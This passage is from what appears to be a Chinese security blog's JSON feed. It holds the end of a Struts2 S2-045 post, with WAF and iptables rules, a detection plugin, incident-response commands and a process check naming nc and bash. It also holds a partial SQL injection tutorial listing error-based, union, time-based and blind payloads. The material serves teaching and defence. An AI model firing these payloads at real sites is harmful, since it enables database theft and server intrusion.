class=\"hljs-number\">3</span>.<span class=\"hljs-number\">32</span>+ 或 <span class=\"hljs-number\">2.5.10.1</span>+<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-WAF规则配置\"><a href=\"#2-WAF规则配置\" class=\"headerlink\" title=\"2. WAF规则配置\"></a>2. WAF规则配置</h4><p><strong>ModSecurity规则</strong>:</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-meta\"># 检测S2-045攻击特征</span><br>SecRule REQUEST_HEADERS<span class=\"hljs-punctuation\">:</span>Content<span class=\"hljs-punctuation\">-</span>Type <span class=\"hljs-string\">&quot;@detectSQLi&quot;</span> \\<br>    <span class=\"hljs-string\">&quot;id:1001,\\</span><br>    phase<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-punctuation\">,</span>\\<br>    block<span class=\"hljs-punctuation\">,</span>\\<br>    msg<span class=\"hljs-punctuation\">:</span>&#x27;Struts2 S2-045 Attack Detected&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    logdata<span class=\"hljs-punctuation\">:</span>&#x27;Content-Type: %&#123;MATCHED_VAR&#125;&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    tag<span class=\"hljs-punctuation\">:</span>&#x27;attack-sqli&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    tag<span class=\"hljs-punctuation\">:</span>&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;<span class=\"hljs-string\">&quot;</span><br><br><span class=\"hljs-meta\"># 检测OGNL表达式</span><br>SecRule REQUEST_HEADERS<span class=\"hljs-punctuation\">:</span>Content<span class=\"hljs-punctuation\">-</span>Type <span class=\"hljs-string\">&quot;@contains %&#123;&quot;</span> \\<br>    <span class=\"hljs-string\">&quot;id:1002,\\</span><br>    phase<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-punctuation\">,</span>\\<br>    block<span class=\"hljs-punctuation\">,</span>\\<br>    msg<span class=\"hljs-punctuation\">:</span>&#x27;Potential OGNL Injection in Content-Type&#x27;<span class=\"hljs-string\">&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-网络层防护\"><a href=\"#3-网络层防护\" class=\"headerlink\" title=\"3. 网络层防护\"></a>3. 网络层防护</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"># iptables规则示例<br>iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp <span class=\"hljs-attr\">--dport</span> <span class=\"hljs-number\">8080</span> -m string <span class=\"hljs-attr\">--string</span> &quot;%&#123;&quot; <span class=\"hljs-attr\">--algo</span> bm -j DROP<br>iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp <span class=\"hljs-attr\">--dport</span> <span class=\"hljs-number\">8080</span> -m string <span class=\"hljs-attr\">--string</span> &quot;ognl&quot; <span class=\"hljs-attr\">--algo</span> bm -j DROP<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-应用层加固\"><a href=\"#4-应用层加固\" class=\"headerlink\" title=\"4. 应用层加固\"></a>4. 应用层加固</h4><figure class=\"highlight scala\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scala\"><span class=\"hljs-comment\">// 自定义拦截器</span><br>public <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">SecurityInterceptor</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">AbstractInterceptor</span> </span>&#123;<br>    <span class=\"hljs-meta\">@Override</span><br>    public <span class=\"hljs-type\">String</span> intercept(<span class=\"hljs-type\">ActionInvocation</span> invocation) <span class=\"hljs-keyword\">throws</span> <span class=\"hljs-type\">Exception</span> &#123;<br>        <span class=\"hljs-type\">HttpServletRequest</span> request = <span class=\"hljs-type\">ServletActionContext</span>.getRequest();<br>        <span class=\"hljs-type\">String</span> contentType = request.getContentType();<br>        <br>        <span class=\"hljs-keyword\">if</span> (contentType != <span class=\"hljs-literal\">null</span> &amp;&amp; contentType.contains(<span class=\"hljs-string\">&quot;%&#123;&quot;</span>)) &#123;<br>            <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-type\">SecurityException</span>(<span class=\"hljs-string\">&quot;Malicious Content-Type detected&quot;</span>);<br>        &#125;<br>        <br>        <span class=\"hljs-keyword\">return</span> invocation.invoke();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"实战技巧与工具\"><a href=\"#实战技巧与工具\" class=\"headerlink\" title=\"实战技巧与工具\"></a>实战技巧与工具</h2><h3 id=\"BurpSuite插件开发\"><a href=\"#BurpSuite插件开发\" class=\"headerlink\" title=\"BurpSuite插件开发\"></a>BurpSuite插件开发</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-comment\">// S2-045检测插件框架</span><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">S2045Scanner</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">IScannerCheck</span> &#123;<br>    <span class=\"hljs-meta\">@Override</span><br>    <span class=\"hljs-keyword\">public</span> List&lt;IScanIssue&gt; <span class=\"hljs-title function_\">doActiveScan</span><span class=\"hljs-params\">(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)</span> &#123;<br>        <span class=\"hljs-comment\">// 构造S2-045 payload</span><br>        <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">payload</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;)...&#125;&quot;</span>;<br>        <br>        <span class=\"hljs-comment\">// 发送测试请求</span><br>        <span class=\"hljs-type\">byte</span>[] checkRequest = insertionPoint.buildRequest(payload.getBytes());<br>        <span class=\"hljs-type\">IHttpRequestResponse</span> <span class=\"hljs-variable\">checkRequestResponse</span> <span class=\"hljs-operator\">=</span> callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);<br>        <br>        <span class=\"hljs-comment\">// 分析响应判断是否存在漏洞</span><br>        <span class=\"hljs-keyword\">if</span> (isVulnerable(checkRequestResponse)) &#123;<br>            <span class=\"hljs-keyword\">return</span> Collections.singletonList(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">CustomScanIssue</span>(<span class=\"hljs-comment\">/* ... */</span>));<br>        &#125;<br>        <br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"批量检测脚本\"><a href=\"#批量检测脚本\" class=\"headerlink\" title=\"批量检测脚本\"></a>批量检测脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/bin/bash</span><br><span class=\"hljs-comment\"># S2-045批量检测脚本</span><br><br>targets=(<br>    <span class=\"hljs-string\">&quot;http://target1.com:8080&quot;</span><br>    <span class=\"hljs-string\">&quot;http://target2.com:8080&quot;</span><br>    <span class=\"hljs-string\">&quot;http://target3.com:8080&quot;</span><br>)<br><br><span class=\"hljs-keyword\">for</span> target <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;targets[@]&#125;</span>&quot;</span>; <span class=\"hljs-keyword\">do</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Testing: <span class=\"hljs-variable\">$target</span>&quot;</span><br>    python3 s2-045-check.py <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$target</span>&quot;</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;---&quot;</span><br><span class=\"hljs-keyword\">done</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"应急响应指南\"><a href=\"#应急响应指南\" class=\"headerlink\" title=\"应急响应指南\"></a>应急响应指南</h2><h3 id=\"1-漏洞确认\"><a href=\"#1-漏洞确认\" class=\"headerlink\" title=\"1. 漏洞确认\"></a>1. 漏洞确认</h3><figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\"># 检查Struts2版本<br><span class=\"hljs-keyword\">find</span> <span class=\"hljs-regexp\">/ -name &quot;struts2-core-*.jar&quot; 2&gt;/</span>dev/<span class=\"hljs-keyword\">null</span><br><br># 检查访问日志中的攻击特征<br><span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;Content-Type.*%\\&#123;&quot;</span> <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/apache2/</span>access.log<br><span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;ognl|ProcessBuilder|Runtime&quot;</span> <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/tomcat/</span>catalina.out<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-应急处置\"><a href=\"#2-应急处置\" class=\"headerlink\" title=\"2. 应急处置\"></a>2. 应急处置</h3><figure class=\"highlight sas\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sas\"># 临时阻断攻击IP<br>iptables -A <span class=\"hljs-keyword\">INPUT</span> -s &lt;攻击IP&gt; -j <span class=\"hljs-keyword\">DROP</span><br><br># 停止相关服务<br>systemctl <span class=\"hljs-keyword\">stop</span> tomcat<br>systemctl <span class=\"hljs-keyword\">stop</span> apache2<br><br># 备份系统状态<br>tar -czf /tmp/system_backup_$(date +<span class=\"hljs-title function_\">%Y</span><span class=\"hljs-title function_\">%m</span><span class=\"hljs-title function_\">%d_</span><span class=\"hljs-title function_\">%H</span><span class=\"hljs-title function_\">%M</span><span class=\"hljs-title function_\">%S</span>).tar.gz /var/log /etc /opt/tomcat<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-痕迹清理检查\"><a href=\"#3-痕迹清理检查\" class=\"headerlink\" title=\"3. 痕迹清理检查\"></a>3. 痕迹清理检查</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\"># 检查是否有异常进程<br><span class=\"hljs-keyword\">ps</span> aux | <span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;nc|bash|sh|python|perl&quot;</span> | <span class=\"hljs-keyword\">grep</span> -v <span class=\"hljs-keyword\">grep</span><br><br># 检查网络连接<br>netstat -antlp | <span class=\"hljs-keyword\">grep</span> ESTABLISHED<br><br># 检查新增文件<br><span class=\"hljs-keyword\">find</span> /tmp /var/tmp -<span class=\"hljs-built_in\">type</span> <span class=\"hljs-keyword\">f</span> -mtime -<span class=\"hljs-number\">1</span><br><span class=\"hljs-keyword\">find</span> /<span class=\"hljs-keyword\">opt</span>/tomcat/webapps -name <span class=\"hljs-string\">&quot;*.jsp&quot;</span> -mtime -<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>Struts2-045漏洞的特点：</p>\n<h3 id=\"优势（从攻击者角度）\"><a href=\"#优势（从攻击者角度）\" class=\"headerlink\" title=\"优势（从攻击者角度）\"></a>优势（从攻击者角度）</h3><ul>\n<li><strong>利用简单</strong>: 只需构造HTTP请求头即可</li>\n<li><strong>影响面广</strong>: 大量企业级应用使用Struts2框架</li>\n<li><strong>检测困难</strong>: 攻击流量可能被忽略</li>\n<li><strong>危害严重</strong>: 直接获得服务器执行权限</li>\n</ul>\n<h3 id=\"防护要点\"><a href=\"#防护要点\" class=\"headerlink\" title=\"防护要点\"></a>防护要点</h3><ul>\n<li><strong>及时更新</strong>: 升级到安全版本是根本解决方案</li>\n<li><strong>深度防御</strong>: 结合WAF、IDS等多层防护</li>\n<li><strong>监控告警</strong>: 建立有效的安全监控体系</li>\n<li><strong>应急响应</strong>: 制定完善的安全事件响应流程</li>\n</ul>\n<hr>\n<blockquote>\n<p><strong>免责声明</strong>: 本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。</p>\n</blockquote>\n<p><strong>参考资源</strong>:</p>\n<ul>\n<li><a href=\"https://struts.apache.org/announce.html#a20170307\">Apache Struts2官方安全公告</a></li>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638\">CVE-2017-5638详细信息</a></li>\n<li><a href=\"https://owasp.org/www-project-top-ten/\">OWASP Struts2安全指南</a></li>\n</ul>\n",
            "tags": [
                "Web安全",
                "Struts2",
                "RCE",
                "漏洞复现",
                "OGNL注入"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/",
            "url": "https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/",
            "title": "SQL注入攻击详解",
            "date_published": "2025-07-23T23:51:59.000Z",
            "content_html": "<h1 id=\"SQL注入攻击详解\"><a href=\"#SQL注入攻击详解\" class=\"headerlink\" title=\"SQL注入攻击详解\"></a>SQL注入攻击详解</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>SQL注入作为Web应用程序中最常见的安全漏洞之一，至今仍是攻击者利用的主要手段。本文将详细讲解SQL注入的各种利用方式，帮助安全研究人员和开发者深入理解这一经典漏洞。</p>\n<h2 id=\"什么是SQL注入？\"><a href=\"#什么是SQL注入？\" class=\"headerlink\" title=\"什么是SQL注入？\"></a>什么是SQL注入？</h2><p><strong>SQL注入（SQL Injection）</strong> 是一种将恶意SQL语句插入原本正常查询中的攻击方式。攻击者通过在用户输入中注入特殊的SQL代码，可以控制数据库的查询逻辑，进而读取、修改甚至执行系统命令。</p>\n<h3 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h3><p>当Web应用程序未对用户输入进行充分验证和过滤时，攻击者提交的恶意输入会被直接拼接到SQL查询语句中，导致原有的查询逻辑被改变。</p>\n<h2 id=\"SQL注入类型详解\"><a href=\"#SQL注入类型详解\" class=\"headerlink\" title=\"SQL注入类型详解\"></a>SQL注入类型详解</h2><h3 id=\"1-错误注入（Error-based-Injection）\"><a href=\"#1-错误注入（Error-based-Injection）\" class=\"headerlink\" title=\"1. 错误注入（Error-based Injection）\"></a>1. 错误注入（Error-based Injection）</h3><p><strong>攻击原理</strong>：通过注入有语法错误或运行错误的SQL语句，使数据库抛出报错信息，从错误信息中提取字段、表名、数据库版本等敏感信息。</p>\n<p><strong>核心关键字</strong>：</p>\n<ul>\n<li><code>extractvalue()</code> - XML路径提取函数</li>\n<li><code>updatexml()</code> - XML更新函数</li>\n<li><code>floor(rand(0)*2)</code> - 随机数取整函数</li>\n<li><code>group by</code> - 分组查询</li>\n</ul>\n<p><strong>经典payload示例</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>, concat(<span class=\"hljs-number\">0x7e</span>, <span class=\"hljs-keyword\">user</span>(), <span class=\"hljs-number\">0x7e</span>))<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> updatexml(<span class=\"hljs-number\">1</span>, concat(<span class=\"hljs-number\">0x7e</span>, <span class=\"hljs-keyword\">database</span>(), <span class=\"hljs-number\">0x7e</span>), <span class=\"hljs-number\">1</span>)<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> concat(version(), floor(rand(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">2</span>)) <span class=\"hljs-keyword\">having</span> min(<span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<p><strong>技术细节</strong>：</p>\n<ul>\n<li><code>extractvalue()</code>函数在参数格式错误时会抛出详细的错误信息</li>\n<li><code>0x7e</code>代表波浪号<code>~</code>，用作数据分隔符便于识别</li>\n<li>通过构造特定的错误条件，可以在报错中泄露数据库敏感信息</li>\n</ul>\n<h3 id=\"2-联合查询注入（Union-based-Injection）\"><a href=\"#2-联合查询注入（Union-based-Injection）\" class=\"headerlink\" title=\"2. 联合查询注入（Union-based Injection）\"></a>2. 联合查询注入（Union-based Injection）</h3><p><strong>攻击原理</strong>：通过<code>union select</code>语句将攻击者指定的查询结果与原始查询结果合并，从而在页面上直接显示数据库中的敏感数据。</p>\n<p><strong>核心关键字</strong>：</p>\n<ul>\n<li><code>union select</code> - 联合查询</li>\n<li><code>null</code> - 空值占位符</li>\n<li><code>order by</code> - 字段排序（用于探测列数）</li>\n<li><code>from dual</code> - Oracle数据库虚拟表</li>\n</ul>\n<p><strong>探测与利用流程</strong>：</p>\n<ol>\n<li><strong>确定字段数量</strong>：</li>\n</ol>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\">?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--</span><br>?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-comment\">--</span><br>?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>构造联合查询</strong>：</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">user</span>(),<span class=\"hljs-keyword\">database</span>(),version() <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>提取敏感数据</strong>：</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-built_in\">table_name</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">tables</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-built_in\">column_name</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">columns</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-built_in\">table_name</span>=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-时间延时注入（Time-based-Injection）\"><a href=\"#3-时间延时注入（Time-based-Injection）\" class=\"headerlink\" title=\"3. 时间延时注入（Time-based Injection）\"></a>3. 时间延时注入（Time-based Injection）</h3><p><strong>攻击原理</strong>：通过执行数据库延时函数，根据HTTP响应时间判断注入条件的真假。这种方法特别适用于无页面回显的盲注场景。</p>\n<p><strong>不同数据库的延时函数</strong>：</p>\n<ul>\n<li><strong>MySQL</strong>: <code>sleep(x)</code>, <code>benchmark(count, expr)</code></li>\n<li><strong>PostgreSQL</strong>: <code>pg_sleep(x)</code></li>\n<li><strong>Oracle</strong>: <code>dbms_pipe.receive_message(&#39;&#39;,x)</code></li>\n<li><strong>SQL Server</strong>: <code>waitfor delay &#39;00:00:0x&#39;</code></li>\n</ul>\n<p><strong>典型payload</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> sleep(<span class=\"hljs-number\">5</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(substr(<span class=\"hljs-keyword\">user</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)=<span class=\"hljs-string\">&#x27;r&#x27;</span>, sleep(<span class=\"hljs-number\">3</span>), <span class=\"hljs-number\">0</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span>, benchmark(<span class=\"hljs-number\">5000000</span>,md5(<span class=\"hljs-string\">&#x27;test&#x27;</span>)), <span class=\"hljs-number\">0</span>) <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>盲注自动化技巧</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># 逐位判断数据库名<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;<span class=\"hljs-number\">97</span>, sleep(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">0</span>)<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&lt;<span class=\"hljs-number\">122</span>, sleep(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-布尔盲注（Boolean-based-Blind-Injection）\"><a href=\"#4-布尔盲注（Boolean-based-Blind-Injection）\" class=\"headerlink\" title=\"4. 布尔盲注（Boolean-based Blind Injection）\"></a>4. 布尔盲注（Boolean-based Blind Injection）</h3><p><strong>攻击原理</strong>：通过构造布尔表达式，根据页面返回内容的差异来推测数据库信息。当条件为真时页面正常显示，条件为假时页面异常或内容发生变化。</p>\n<p><strong>核心函数与技巧</strong>：</p>\n<ul>\n<li><code>substr(str, pos, len)</code> - 字符串截取</li>\n<li><code>ascii(char)</code> - 字符转ASCII码</li>\n<li><code>length(str)</code> - 字符串长度</li>\n<li><code>like</code> - 模糊匹配</li>\n</ul>\n<p><strong>实战示例</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"># 判断数据库名长度<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> length(<span class=\"hljs-keyword\">database</span>())=<span class=\"hljs-number\">8</span> <span class=\"hljs-comment\">--</span><br><br># 逐位爆破数据库名<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span> <span class=\"hljs-comment\">--  # &#x27;s&#x27;</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">101</span> <span class=\"hljs-comment\">--  # &#x27;e&#x27;</span><br><br># 使用<span class=\"hljs-keyword\">like</span>进行模糊匹配<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">like</span> <span class=\"hljs-string\">&#x27;sec%&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-堆叠查询注入（Stacked-Query-Injection）\"><a href=\"#5-堆叠查询注入（Stacked-Query-Injection）\" class=\"headerlink\" title=\"5. 堆叠查询注入（Stacked Query Injection）\"></a>5. 堆叠查询注入（Stacked Query Injection）</h3><p><strong>攻击原理</strong>：当数据库和Web应用支持在一次请求中执行多条SQL语句时，攻击者可以使用分号<code>;</code>分隔多条语句，实现更复杂的攻击操作。</p>\n<p><strong>支持情况</strong>：</p>\n<ul>\n<li><strong>MySQL</strong>: 需要使用<code>multi_query()</code>函数，默认不支持</li>\n<li><strong>SQL Server</strong>: 默认支持</li>\n<li><strong>PostgreSQL</strong>: 支持</li>\n<li><strong>Oracle</strong>: 不支持</li>\n</ul>\n<p><strong>危险操作示例</strong>：</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span 